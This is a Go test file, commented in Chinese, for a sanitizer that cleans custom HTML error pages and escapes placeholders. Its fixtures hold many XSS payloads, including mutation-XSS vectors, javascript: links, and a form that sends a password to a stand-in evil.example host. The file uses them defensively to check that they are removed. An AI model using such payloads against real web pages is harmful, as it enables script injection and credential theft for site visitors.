package webpage

import (
	"bytes"
	"net/http/httptest"
	"slices"
	"strings"
	"testing"

	xhtml "golang.org/x/net/html"
)

// unsafeNodes 重新解析清理后的页面，返回其中仍可执行或会把访客带走的内容，用于断言与模糊测试。
// 解析方式与浏览器一致：sandbox 下脚本被禁用，noscript 中的内容按普通标记解析。
func unsafeNodes(t testing.TB, page string) []string {
	t.Helper()
	var bad []string
	for _, scripting := range []bool{true, false} {
		doc, err := xhtml.ParseWithOptions(strings.NewReader(page), xhtml.ParseOptionEnableScripting(scripting))
		if err != nil {
			t.Fatalf("清理后的页面无法解析: %v", err)
		}
		var walk func(n *xhtml.Node)
		walk = func(n *xhtml.Node) {
			if n.Type == xhtml.ElementNode {
				name := strings.ToLower(n.Data)
				if _, drop := dropElements[name]; drop || name == "form" || name == "link" {
					bad = append(bad, "<"+name+">")
				}
				if name == "meta" && attr(n, "http-equiv") != "" {
					bad = append(bad, "meta http-equiv")
				}
				for _, a := range n.Attr {
					c := compact(a.Val)
					if strings.HasPrefix(strings.ToLower(a.Key), "on") {
						bad = append(bad, "事件属性 "+a.Key)
					}
					for _, s := range dangerousSchemes {
						if strings.Contains(c, s) {
							bad = append(bad, "危险链接 "+a.Key+"="+a.Val)
						}
					}
					if k := strings.ToLower(a.Key); k == "srcdoc" || k == "formaction" || k == "action" {
						bad = append(bad, "属性 "+a.Key)
					}
				}
			}
			for c := n.FirstChild; c != nil; c = c.NextSibling {
				walk(c)
			}
		}
		walk(doc)
	}
	return bad
}

func mustSanitize(t *testing.T, src string) (string, CheckReport) {
	t.Helper()
	page, rep, err := SanitizeCustom([]byte(src))
	if err != nil {
		t.Fatalf("清理失败: %v\n%s", err, src)
	}
	return page, rep
}

// 常见的脚本注入写法都被清理掉，清理后的页面重新解析（含禁用脚本时的解析）不再含可执行内容，正常内容保留。
func TestSanitizeCustomRemovesActiveContent(t *testing.T) {
	cases := map[string]string{
		"script":            `<h1>错误</h1><script>alert(1)</script>`,
		"大写 script":         `<h1>错误</h1><SCRIPT SRC=//evil.example/x.js></SCRIPT>`,
		"事件属性":              `<h1 onclick="alert(1)">错误</h1><img src=x onerror=alert(1)>`,
		"大写事件属性":            `<body ONLOAD=alert(1)><h1>错误</h1></body>`,
		"javascript 链接":     `<a href="javascript:alert(1)">回首页</a>`,
		"实体编码的 javascript":  `<a href="&#106;avascript&#58;alert(1)">回首页</a>`,
		"带空白的 javascript":   "<a href=\"java\tscript:alert(1)\">回首页</a><a href=\" javascript:alert(2)\">x</a>",
		"vbscript":          `<a href="VBScript:msgbox(1)">x</a>`,
		"data html 链接":      `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`,
		"iframe":            `<h1>x</h1><iframe src="https://evil.example"></iframe><iframe srcdoc="<script>alert(1)</script>"></iframe>`,
		"object embed":      `<h1>x</h1><object data="x.swf"></object><embed src="x.swf"><applet code=x></applet>`,
		"meta refresh":      `<meta http-equiv="refresh" content="0;url=https://evil.example"><h1>x</h1>`,
		"meta set-cookie":   `<meta http-equiv="Set-Cookie" content="a=b"><h1>x</h1>`,
		"base":              `<base href="https://evil.example/"><a href="/">x</a>`,
		"表单":                `<form action="https://evil.example/steal"><input name=p type=password><button formaction="javascript:alert(1)">登录</button></form>`,
		"svg 脚本":            `<svg><script>alert(1)</script><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
		"svg 动画改链接":         `<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text>x</text></a></svg>`,
		"svg onload":        `<svg onload=alert(1)><circle r=4></circle></svg>`,
		"noscript 变异":       `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript><h1>x</h1>`,
		"math 变异":           `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math><h1>x</h1>`,
		"template":          `<template><img src=x onerror=alert(1)></template><h1>x</h1>`,
		"样式 expression":     `<h1 style="width:expression(alert(1))">x</h1><p>正文</p>`,
		"样式标签 binding":      `<style>body{-moz-binding:url(x.xml#x)}</style><h1>x</h1>`,
		"样式 javascript url": `<style>body{background:url(javascript:alert(1))}</style><h1>x</h1>`,
		"link import":       `<link rel="import" href="x.html"><link rel=preload href=x.js as=script><h1>x</h1>`,
		"条件注释":              `<!--[if IE]><script>alert(1)</script><![endif]--><h1>x</h1>`,
		"未闭合标签":             `<h1>x<script>alert(1)`,
		"portal":            `<portal src="https://evil.example"></portal><h1>x</h1>`,
	}
	for name, src := range cases {
		t.Run(name, func(t *testing.T) {
			page, rep := mustSanitize(t, src)
			if bad := unsafeNodes(t, page); len(bad) > 0 {
				t.Fatalf("清理后仍有危险内容 %v:\n%s", bad, page)
			}
			if len(rep.Removed) == 0 && len(rep.Warnings) == 0 {
				t.Fatalf("应提示清理了内容: %+v", rep)
			}
			if strings.Contains(strings.ToLower(page), "alert(") && strings.Contains(strings.ToLower(page), "<script") {
				t.Fatalf("脚本未清理:\n%s", page)
			}
		})
	}
}

// 正常的页面内容（样式、data: 图片、SVG、外部链接、视口与标题）原样保留，不提示清理。
func TestSanitizeCustomKeepsNormalPage(t *testing.T) {
	src := `<!doctype html><html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>出错了 {code}</title><link rel="icon" href="data:image/png;base64,iVBORw0KGgo=">
<style>body{font:16px sans-serif;background:url(data:image/png;base64,iVBORw0KGgo=)}h1{color:#c00}</style></head>
<body><h1 class="t">{code} {title}</h1><p>{detail}</p><img alt="logo" src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">
<svg viewBox="0 0 10 10" width="20"><circle cx="5" cy="5" r="4" fill="red"/><use href="#x"/></svg>
<a href="/">首页</a> <a href="https://status.example.com" target="_blank" rel="noopener">状态页</a><button type="button">按钮</button></body></html>`
	page, rep := mustSanitize(t, src)
	if len(rep.Removed) != 0 || len(rep.Warnings) != 0 {
		t.Fatalf("正常页面不应提示: %+v", rep)
	}
	for _, want := range []string{`<meta name="viewport"`, `<style>body{font:16px sans-serif`, `rel="icon"`, `<svg viewBox="0 0 10 10"`, `href="https://status.example.com"`, `src="data:image/svg+xml;base64,`, `<button type="button">`, "<!DOCTYPE html>"} {
		if !strings.Contains(page, want) {
			t.Fatalf("应保留 %q:\n%s", want, page)
		}
	}
	if rep.PageTitle != "出错了 {code}" {
		t.Fatalf("标题 %q", rep.PageTitle)
	}
	if !slices.Equal(rep.Placeholders, []string{"{code}", "{title}", "{detail}"}) {
		t.Fatalf("占位符 %v", rep.Placeholders)
	}
	// 清理是幂等的：已清理的页面再清理一次内容不变（保存时会再次清理）
	again, rep2 := mustSanitize(t, page)
	if again != page || len(rep2.Removed) != 0 {
		t.Fatalf("再次清理后内容变化:\n%s\n---\n%s", page, again)
	}
}

// 不会加载的资源（外部与站内相对地址的图片、字体、样式表）给出提示，但不拒绝保存。
func TestSanitizeCustomWarnsResources(t *testing.T) {
	src := `<meta name="viewport" content="width=device-width"><link rel="stylesheet" href="https://cdn.example.com/a.css">
<style>@import "https://fonts.example.com/f.css";@font-face{src:url('/fonts/x.woff2')}</style>
<h1>{code}</h1><img src="/logo.png" srcset="https://cdn.example.com/a.png 1x, data:image/png;base64,AA 2x"><a href="https://ok.example.com">链接不算</a>`
	page, rep := mustSanitize(t, src)
	if strings.Contains(page, "<link") {
		t.Fatalf("外部样式表应去掉:\n%s", page)
	}
	all := strings.Join(rep.Warnings, "\n")
	for _, want := range []string{"外部样式表不会加载", "https://cdn.example.com/a.css", "/logo.png", "https://fonts.example.com/f.css"} {
		if !strings.Contains(all, want) {
			t.Fatalf("提示中应含 %q: %v", want, rep.Warnings)
		}
	}
	if strings.Contains(all, "ok.example.com") {
		t.Fatalf("普通链接不应提示: %v", rep.Warnings)
	}
}

// 无法作为页面使用的内容直接拒绝，并给出原因。
func TestSanitizeCustomRejects(t *testing.T) {
	cases := map[string][]byte{
		"空":       []byte("  \n "),
		"超过上限":    append([]byte("<h1>x</h1>"), bytes.Repeat([]byte("a"), MaxCustomPage)...),
		"空字符":     []byte("<h1>x\x00</h1>"),
		"非 UTF-8": []byte("<h1>\xb4\xed\xce\xf3</h1>"),
		"纯文本":     []byte("root:x:0:0:root:/root:/bin/bash\n"),
		"私钥":      []byte("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n-----END OPENSSH PRIVATE KEY-----\n"),
		"只有脚本":    []byte("<script>alert(1)</script>"),
	}
	for name, src := range cases {
		if _, _, err := SanitizeCustom(src); err == nil {
			t.Errorf("%s: 应拒绝", name)
		}
	}
	// 带 BOM 的 UTF-8 页面可以使用
	if _, _, err := SanitizeCustom([]byte("\xef\xbb\xbf<h1>x</h1>")); err != nil {
		t.Fatalf("带 BOM 的页面应可使用: %v", err)
	}
}

// 缺少视口、编码声明不是 UTF-8、没用占位符时给出提示。
func TestSanitizeCustomUsabilityWarnings(t *testing.T) {
	page, rep := mustSanitize(t, `<meta charset="gbk"><h1>出错了</h1>`)
	all := strings.Join(rep.Warnings, "\n")
	for _, want := range []string{"viewport", "UTF-8", "占位符"} {
		if !strings.Contains(all, want) {
			t.Fatalf("提示中应含 %q: %v", want, rep.Warnings)
		}
	}
	if strings.Contains(page, "gbk") {
		t.Fatalf("非 UTF-8 的编码声明应去掉:\n%s", page)
	}
}

// 表单只去掉 form 本身，其中的内容保留。
func TestSanitizeCustomUnwrapsForm(t *testing.T) {
	page, _ := mustSanitize(t, `<form action="/x"><p>联系管理员</p><input type="text"></form>`)
	if strings.Contains(page, "<form") || !strings.Contains(page, "<p>联系管理员</p>") || !strings.Contains(page, "<input") {
		t.Fatalf("表单处理不对:\n%s", page)
	}
}

// 占位符替换为转义后的值：访客控制的域名与路径不能注入标签或跳出属性。
func TestRenderCustomEscapes(t *testing.T) {
	page, _ := mustSanitize(t, `<title>{code}</title><h1 title="{path}">{title}</h1><p>{detail}</p><p>{host}|{path}|{status}|{time}</p><style>.x::after{content:"{path}"}</style>`)
	r := httptest.NewRequest("GET", "http://x/", nil)
	r.Header.Set("Accept-Language", "zh-CN")
	r.Host = `evil"><script>alert(1)</script>`
	r.URL.Path = `/"><img src=x onerror=alert(1)></style><script>alert(2)</script>`
	out := string(RenderCustom(page, r, Problem{Code: 502, Title: "无法连接到后端服务", Detail: "<b>说明</b>"}))
	if strings.Contains(out, "<script") || strings.Contains(out, "<img") || strings.Contains(out, "<b>") {
		t.Fatalf("占位符的值未转义:\n%s", out)
	}
	if bad := unsafeNodes(t, out); len(bad) > 0 {
		t.Fatalf("替换后出现危险内容 %v:\n%s", bad, out)
	}
	for _, want := range []string{"<title>502</title>", "无法连接到后端服务", "Bad Gateway", "&lt;b&gt;说明&lt;/b&gt;", "UTC"} {
		if !strings.Contains(out, want) {
			t.Fatalf("应含 %q:\n%s", want, out)
		}
	}
	// 访客语言为英文时标题按英文输出
	r.Header.Set("Accept-Language", "en")
	if out := string(RenderCustom(page, r, Problem{Code: 404, Title: "页面不存在"})); !strings.Contains(out, "Page not found") {
		t.Fatalf("应按访客语言翻译:\n%s", out)
	}
}

// 占位符写在标签名或属性名的位置时去掉，不能借访客控制的路径注入属性。
func TestPlaceholderInNamePosition(t *testing.T) {
	page, rep := mustSanitize(t, `<h1>{code}</h1><div {path}>a</div><meta {path}><x{path}>b</x{path}><p title="{path}">c</p>`)
	if strings.Contains(page, "<div {path}") || strings.Contains(page, "<meta {path}") || strings.Contains(page, "<x{path}") || !strings.Contains(page, `title="{path}"`) {
		t.Fatalf("清理结果:\n%s", page)
	}
	if !slices.Contains(rep.Removed, "写在标签或属性名位置的占位符") {
		t.Fatalf("应提示: %+v", rep)
	}
	r := httptest.NewRequest("GET", "/a%20onclick=alert(1)%20autofocus%20onfocus=alert(2)", nil)
	out := string(RenderCustom(page, r, Problem{Code: 404}))
	if bad := unsafeNodes(t, out); len(bad) > 0 {
		t.Fatalf("替换后出现危险内容 %v:\n%s", bad, out)
	}
}

// {host} 只接受主机名写法，{path} 以单个 / 开头，写进链接时不能拼出其他网站或脚本地址。
func TestShownHostPath(t *testing.T) {
	for in, want := range map[string]string{`javascript:alert(1)//"x`: "", "javascript:alert": "", "a.example.com": "a.example.com", "app.test:8080": "app.test:8080", "[::1]:8443": "[::1]:8443", "10.0.0.1": "10.0.0.1", "a b": "", "": ""} {
		if got := shownHost(in); got != want {
			t.Fatalf("host %q => %q", in, got)
		}
	}
	for in, want := range map[string]string{"//evil.example/x": "/evil.example/x", "/a/b": "/a/b", "": "/", "///": "/"} {
		if got := shownPath(in); got != want {
			t.Fatalf("path %q => %q", in, got)
		}
	}
}

// 过长或含无效字节的域名与路径截断后显示。
func TestClipShown(t *testing.T) {
	long := strings.Repeat("中", 200)
	if got := clipShown(long, 10); got != "中中中…" {
		t.Fatalf("截断 %q", got)
	}
	if got := clipShown("a\xffb", 10); got != "a\uFFFDb" {
		t.Fatalf("无效字节 %q", got)
	}
}

// 模糊测试：任意输入清理后都不含可执行内容，且清理结果再清理不变。
func FuzzSanitizeCustom(f *testing.F) {
	for _, s := range []string{
		`<h1 onclick=x>a</h1>`, `<a href="javascript:x">a</a>`, `<svg><script>x</script></svg>`, `<noscript><p title="</noscript><img onerror=x>">`,
		`<math><mtext><table><mglyph><style><img onerror=x>`, `<form><button formaction=javascript:x>b</button></form>`, `<style>a{b:expression(x)}</style><p>x`,
		`<table><tr><td><select><option><svg><a href=javascript:x>`, `<p>x</p><!--<script>-->`, `<object data=x>`, `<h1>{code}</h1>`,
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, src string) {
		page, _, err := SanitizeCustom([]byte(src))
		if err != nil {
			return
		}
		if bad := unsafeNodes(t, page); len(bad) > 0 {
			t.Fatalf("清理后仍有危险内容 %v:\n%q\n%s", bad, src, page)
		}
		again, _, err := SanitizeCustom([]byte(page))
		if err != nil {
			t.Fatalf("清理后的页面再次清理失败: %v\n%s", err, page)
		}
		if bad := unsafeNodes(t, again); len(bad) > 0 {
			t.Fatalf("再次清理后仍有危险内容 %v", bad)
		}
	})
}
